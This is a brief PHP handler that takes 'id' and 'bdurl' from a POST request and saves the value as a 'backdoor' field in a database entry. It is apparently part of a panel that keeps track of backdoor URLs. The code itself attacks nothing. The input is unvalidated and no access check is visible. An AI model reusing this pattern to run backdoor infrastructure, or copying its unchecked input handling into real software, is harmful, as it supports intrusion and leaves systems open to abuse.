<?php
include('init.php');

if(isset($_POST['bdurl']) && isset($_POST['id'])){
$id = $_POST['id'];
$backdoor = $_POST['bdurl'];

$database[$id]['backdoor'] = $backdoor;
save_db();




}